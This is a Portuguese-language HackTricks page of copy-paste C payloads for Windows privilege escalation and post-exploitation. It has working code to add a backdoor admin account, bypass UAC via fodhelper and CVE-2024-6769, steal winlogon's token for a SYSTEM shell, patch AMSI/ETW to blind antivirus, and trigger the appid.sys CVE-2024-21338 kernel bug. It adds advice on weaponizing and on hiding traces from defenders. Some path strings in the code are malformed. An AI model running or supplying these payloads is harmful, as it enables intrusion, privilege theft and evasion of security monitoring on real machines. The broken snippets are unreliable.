# Windows C Payloads

{{#include ../../banners/hacktricks-training.md}}

Esta página reúne **pequenos snippets C autocontidos** úteis durante Windows Local Privilege Escalation ou post-exploitation. Cada payload foi projetado para ser **fácil de copiar e colar**, requer apenas a Windows API / C runtime e pode ser compilado com `i686-w64-mingw32-gcc` (x86) ou `x86_64-w64-mingw32-gcc` (x64).

> ⚠️  Esses payloads pressupõem que o processo já tenha os privilégios mínimos necessários para executar a ação (por exemplo, `SeDebugPrivilege`, `SeImpersonatePrivilege` ou um contexto de integridade média para um UAC bypass). Eles são destinados a cenários de **red-team ou CTF**, nos quais a exploração de uma vulnerabilidade resultou na execução arbitrária de código nativo.

---

## Adicionar usuário administrador local
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` Registry Hijack (Integridade Medium → High)
Quando o binário confiável **`fodhelper.exe`** é executado, ele consulta o caminho do registro abaixo **sem filtrar o verbo `DelegateExecute`**. Ao inserir nosso comando nessa chave, um atacante pode realizar o bypass do UAC *sem gravar um arquivo no disco*.<sup>[[1]](#references)</sup>

*Caminho do registro consultado por `fodhelper.exe`*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Um PoC mínimo que abre um `cmd.exe` elevado:
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Testado no Windows 10 22H2 e no Windows 11 23H2 (patches de julho de 2025). O bypass ainda funciona porque a Microsoft não corrigiu a verificação de integridade ausente no caminho `DelegateExecute`.*

---

## UAC Bypass – Activation Context Cache Poisoning (`ctfmon.exe`, CVE-2024-6769)
O remapeamento de unidades + activation context cache poisoning ainda funciona em builds corrigidas do Windows 10/11 porque `ctfmon.exe` é executado como um processo de UI confiável de alta integridade que carrega normalmente a partir da unidade `C:` impersonada pelo chamador e reutiliza quaisquer redirecionamentos de DLL que o `CSRSS` tenha armazenado em cache. O abuso ocorre da seguinte forma: redirecionar `C:` para um armazenamento controlado pelo atacante, inserir uma `msctf.dll` trojanizada, iniciar `ctfmon.exe` para obter alta integridade e, em seguida, solicitar ao `CSRSS` que armazene em cache um manifest que redirecione uma DLL usada por um binário autoelevado (por exemplo, `fodhelper.exe`), para que a próxima inicialização herde seu payload sem um prompt do UAC.<sup>[[5]](#references)</sup>

Fluxo de trabalho prático:
1. Prepare uma árvore `%SystemRoot%\System32` falsa e copie o binário legítimo que você planeja sequestrar (geralmente `ctfmon.exe`).
2. Use `DefineDosDevice(DDD_RAW_TARGET_PATH)` para remapear `C:` dentro do seu processo, mantendo `DDD_NO_BROADCAST_SYSTEM` para que a alteração permaneça local.
3. Insira sua DLL + manifest na árvore falsa, chame `CreateActCtx/ActivateActCtx` para inserir o manifest no activation-context cache e, em seguida, inicie o binário autoelevado para que ele resolva a DLL redirecionada diretamente para o seu shellcode.
4. Exclua a entrada do cache (`sxstrace ClearCache`) ou reinicie o sistema ao terminar para apagar os rastros do atacante.

<details>
<summary>C - Fake drive + manifest poison helper (CVE-2024-6769)</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")

BOOL WriteWideFile(const wchar_t *path, const wchar_t *data) {
HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if (h == INVALID_HANDLE_VALUE) return FALSE;
DWORD bytes = (DWORD)(wcslen(data) * sizeof(wchar_t));
BOOL ok = WriteFile(h, data, bytes, &bytes, NULL);
CloseHandle(h);
return ok;
}

int wmain(void) {
const wchar_t *stage = L"C:\\Users\\Public\\fakeC\\Windows\\System32";
SHCreateDirectoryExW(NULL, stage, NULL);
CopyFileW(L"C:\\Windows\\System32\\ctfmon.exe", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\ctfmon.exe", FALSE);
CopyFileW(L".\\msctf.dll", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll", FALSE);

DefineDosDeviceW(DDD_RAW_TARGET_PATH | DDD_NO_BROADCAST_SYSTEM,
L"C:", L"\\??\\C:\\Users\\Public\\fakeC");

const wchar_t manifest[] =
L"<?xml version='1.0' encoding='UTF-8' standalone='yes'?>"
L"<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>"
L" <dependency><dependentAssembly>"
L"  <assemblyIdentity name='Microsoft.Windows.Common-Controls' version='6.0.0.0'"
L"   processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*' />"
L"  <file name='advapi32.dll' loadFrom='C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll' />"
L" </dependentAssembly></dependency></assembly>";
WriteWideFile(L"C:\\Users\\Public\\fakeC\\payload.manifest", manifest);

ACTCTXW act = { sizeof(act) };
act.lpSource = L"C:\\Users\\Public\\fakeC\\payload.manifest";
ULONG_PTR cookie = 0;
HANDLE ctx = CreateActCtxW(&act);
ActivateActCtx(ctx, &cookie);

STARTUPINFOW si = { sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
CreateProcessW(L"C:\\Windows\\System32\\ctfmon.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

WaitForSingleObject(pi.hProcess, 2000);
DefineDosDeviceW(DDD_REMOVE_DEFINITION, L"C:", L"\\??\\C:\\Users\\Public\\fakeC");
return 0;
}
```
</details>

Dica de limpeza: após obter SYSTEM, execute `sxstrace Trace -logfile %TEMP%\sxstrace.etl` seguido de `sxstrace Parse` durante os testes — se o nome do seu manifest aparecer no log, os defensores também poderão vê-lo, portanto alterne os paths a cada execução.

---

## Gerar shell SYSTEM via token duplication (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
Se o processo atual tiver **ambos** os privilégios `SeDebug` e `SeImpersonate` (comum em muitas contas de serviço), você poderá roubar o token de `winlogon.exe`, duplicá-lo e iniciar um processo elevado:
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
Para uma explicação mais detalhada de como isso funciona, consulte:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## Patch de AMSI e ETW em Memória (Evasão de Defesa)
A maioria dos mecanismos modernos de AV/EDR depende do **AMSI** e do **ETW** para inspecionar comportamentos maliciosos. Aplicar um patch em ambas as interfaces no início do processo atual impede que payloads baseados em scripts (por exemplo, PowerShell e JScript) sejam analisados.<sup>[[2]](#references)</sup>
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*O patch acima é local ao processo; iniciar um novo PowerShell após executá-lo fará com que ele seja executado sem inspeção do AMSI/ETW.*

---

## Criar um filho como Protected Process Light (PPL)
Solicite um nível de proteção PPL para um filho no momento da criação usando `STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL`. Esta é uma API documentada e só terá sucesso se a imagem de destino estiver assinada para a classe de signer solicitada (Windows/WindowsLight/Antimalware/LSA/WinTcb).<sup>[[3]](#references)[[4]](#references)</sup>
```c
// x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
#include <windows.h>

int wmain(void) {
STARTUPINFOEXW si = {0};
PROCESS_INFORMATION pi = {0};
si.StartupInfo.cb = sizeof(si);

SIZE_T attrSize = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

DWORD lvl = PROTECTION_LEVEL_ANTIMALWARE_LIGHT; // choose the desired level
UpdateProcThreadAttribute(si.lpAttributeList, 0,
PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
&lvl, sizeof(lvl), NULL, NULL);

if (!CreateProcessW(L"C\\\Windows\\\System32\\\notepad.exe", NULL, NULL, NULL, FALSE,
EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
// likely ERROR_INVALID_IMAGE_HASH (577) if the image is not properly signed for that level
return 1;
}
DeleteProcThreadAttributeList(si.lpAttributeList);
HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);
return 0;
}
```
Níveis usados com mais frequência:
- `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
- `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
- `PROTECTION_LEVEL_LSA_LIGHT` (4)

Valide o resultado com o Process Explorer/Process Hacker verificando a coluna Protection.

---

## Local Service -> Kernel via `appid.sys` Smart-Hash (`IOCTL 0x22A018`, CVE-2024-21338)
`appid.sys` expõe um device object (`\\.\\AppID`) cujo IOCTL de manutenção do smart-hash aceita function pointers fornecidos pelo usuário sempre que o caller é executado como `LOCAL SERVICE`; o Lazarus está abusando disso para desabilitar o PPL e carregar drivers arbitrários, portanto as equipes de red team devem ter um trigger pronto para uso em laboratório.<sup>[[6]](#references)</sup>

Notas operacionais:
- Você ainda precisa de um token `LOCAL SERVICE`. Roube-o de `Schedule` ou `WdiServiceHost` usando `SeImpersonatePrivilege` e faça impersonate antes de acessar o device, para que as verificações de ACL sejam aprovadas.
- O IOCTL `0x22A018` espera uma struct contendo dois callback pointers (query length + read function). Aponte ambos para stubs em user-mode que criem um token overwrite ou mapeiem primitivas de ring-0, mas mantenha os buffers como RWX para que o KernelPatchGuard não cause um crash no meio da cadeia.
- Após o sucesso, saia do impersonate e reverta o device handle; os defensores agora procuram handles inesperados para `Device\\AppID`, portanto feche-o imediatamente após obter o privilégio.

<details>
<summary>C - Skeleton trigger para abuso do smart-hash do `appid.sys`</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>

typedef struct _APPID_SMART_HASH {
ULONGLONG UnknownCtx[4];
PVOID QuerySize;   // called first
PVOID ReadBuffer;  // called with size returned above
BYTE  Reserved[0x40];
} APPID_SMART_HASH;

DWORD WINAPI KernelThunk(PVOID ctx) {
// map SYSTEM shellcode, steal token, etc.
return 0;
}

int wmain(void) {
HANDLE hDev = CreateFileW(L"\\\\.\\AppID", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
if (hDev == INVALID_HANDLE_VALUE) {
printf("[-] CreateFileW failed: %lu\n", GetLastError());
return 1;
}

APPID_SMART_HASH in = {0};
in.QuerySize = KernelThunk;
in.ReadBuffer = KernelThunk;

DWORD bytes = 0;
if (!DeviceIoControl(hDev, 0x22A018, &in, sizeof(in), NULL, 0, &bytes, NULL)) {
printf("[-] DeviceIoControl failed: %lu\n", GetLastError());
}
CloseHandle(hDev);
return 0;
}
```
</details>

Correção mínima para um build weaponized: mapeie uma seção RWX com `VirtualAlloc`, copie seu stub de token duplication para lá, defina `KernelThunk = section` e, assim que `DeviceIoControl` retornar, você deverá ser SYSTEM mesmo sob PPL.

---

## Referências

- [1] [Primeira entrada: boas-vindas e fileless UAC bypass (fodhelper.exe / ms-settings DelegateExecute)](https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/)
- [2] [Memory Patching AMSI Bypass](https://rastamouse.me/memory-patching-amsi-bypass/)
- [3] [CreateProcessAsPPL – launcher mínimo de processos PPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [4] [função UpdateProcThreadAttribute (aplicativos Win32) - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-updateprocthreadattribute)
- [5] [Nova exploit chain permite Windows UAC bypass](https://www.darkreading.com/vulnerabilities-threats/exploit-chain-windows-uac-bypass)
- [6] [Lazarus e o rootkit FudModule: além de BYOVD com um zero-day de admin-to-kernel](https://www.gendigital.com/blog/insights/research/lazarus-and-the-fudmodule-rootkit-beyond-byovd-with-an-admin-to-kernel-zero-day)

{{#include ../../banners/hacktricks-training.md}}
